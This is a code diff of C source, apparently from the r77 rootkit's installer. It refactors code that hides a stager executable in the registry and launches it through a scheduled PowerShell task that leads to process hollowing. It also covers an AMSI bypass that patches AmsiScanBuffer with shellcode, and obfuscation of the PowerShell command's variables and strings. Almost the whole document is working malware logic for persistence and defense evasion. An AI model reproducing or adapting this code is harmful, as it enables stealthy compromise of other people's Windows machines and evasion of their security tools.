@@ -15,13 +15,8 @@ int main()
 	// Write stager executable to registry.
 	// This C# executable is compiled with AnyCPU and can be run by both 32-bit and 64-bit powershell.
 	// The target framework is 3.5, but it will run, even if .NET 4.x is installed and .NET 3.5 isn't.
-	// Because the powershell command may run using .NET 3.5, there is no access to a specific registry view.
-	// Therefore, the executable needs to be written to both the 32-bit and the 64-bit registry view.
 
 	HKEY key;
-	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_32KEY, &key) != ERROR_SUCCESS ||
-		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;
-
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS ||
 		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;
 
@@ -29,30 +24,22 @@ int main()
 	// The C# binary will proceed with creating a native process using process hollowing.
 	// The powershell command is purely inline and doesn't require a ps1 file.
 
-	LPWSTR powershellCommand32 = GetPowershellCommand(FALSE);
-	LPWSTR powershellCommand64 = GetPowershellCommand(TRUE);
+	LPWSTR powershellCommand = GetPowershellCommand();
 
-	// Create 32-bit scheduled task to run the powershell stager.
+	// Create scheduled task to run the powershell stager.
 	DeleteScheduledTask(R77_SERVICE_NAME32);
-	if (CreateScheduledTask(R77_SERVICE_NAME32, Is64BitOperatingSystem() ? L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0" : L"", L"powershell", powershellCommand32))
-	{
-		RunScheduledTask(R77_SERVICE_NAME32);
-	}
+	DeleteScheduledTask(R77_SERVICE_NAME64);
 
-	// Create 64-bit scheduled task to run the powershell stager.
-	if (Is64BitOperatingSystem())
+	LPCWSTR scheduledTaskName = Is64BitOperatingSystem() ? R77_SERVICE_NAME64 : R77_SERVICE_NAME32;
+	if (CreateScheduledTask(scheduledTaskName, L"", L"powershell", powershellCommand))
 	{
-		DeleteScheduledTask(R77_SERVICE_NAME64);
-		if (CreateScheduledTask(R77_SERVICE_NAME64, L"", L"powershell", powershellCommand64))
-		{
-			RunScheduledTask(R77_SERVICE_NAME64);
-		}
+		RunScheduledTask(scheduledTaskName);
 	}
 
 	return 0;
 }
 
-LPWSTR GetPowershellCommand(BOOL is64Bit)
+LPWSTR GetPowershellCommand()
 {
 	// Powershell inline command to be invoked using powershell.exe "..."
 
@@ -90,7 +77,7 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 			// Use Microsoft.Win32.UnsafeNativeMethods for some DllImport's.
 			L"$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(`System.dll`)})"
 			L".GetType(`Microsoft.Win32.UnsafeNativeMethods`);"
-			L"$GetProcAddress=$NativeMethods.GetMethod(`GetProcAddress`,[Reflection.BindingFlags]`Public,Static`,$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);"
+			L"$GetProcAddress=$NativeMethods.GetMethod(`GetProcAddress`,[Reflection.BindingFlags](`Public,Static`),$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);"
 
 			// Create delegate types
 			L"$LoadLibraryDelegate=Get-Delegate @([String])([IntPtr]);"
@@ -111,7 +98,7 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 		);
 
 		// Overwrite AmsiScanBuffer function with shellcode to return AMSI_RESULT_CLEAN.
-		if (is64Bit)
+		if (Is64BitOperatingSystem())
 		{
 			// b8 57 00 07 80	mov		eax, 0x80070057
 			// c3				ret
@@ -144,6 +131,9 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 
 	StrCatW(command, L"\"");
 
+	// Replace string literals that are marked with `thestring`.
+	ObfuscatePowershellStringLiterals(command);
+
 	// Obfuscate all variable names with random strings.
 	ObfuscatePowershellVariable(command, L"Get-Delegate");
 	ObfuscatePowershellVariable(command, L"ParameterTypes");
@@ -159,9 +149,6 @@ LPWSTR GetPowershellCommand(BOOL is64Bit)
 	ObfuscatePowershellVariable(command, L"AmsiPtr");
 	ObfuscatePowershellVariable(command, L"AmsiScanBufferPtr");
 	ObfuscatePowershellVariable(command, L"OldProtect");
-
-	// Replace string literals that are marked with `thestring`.
-	ObfuscatePowershellStringLiterals(command);
 
 	return command;
 }
@@ -261,7 +248,7 @@ VOID ObfuscatePowershellStringLiterals(LPWSTR command)
 	}
 
 	// Append remaining string after the last quoted string.
-	StrNCatW(newCommand, commandPtr, lstrlenW(command) - (commandPtr - command));
+	StrCatW(newCommand, commandPtr);
 
 	StrCpyW(command, newCommand);
 	FREE(newCommand);
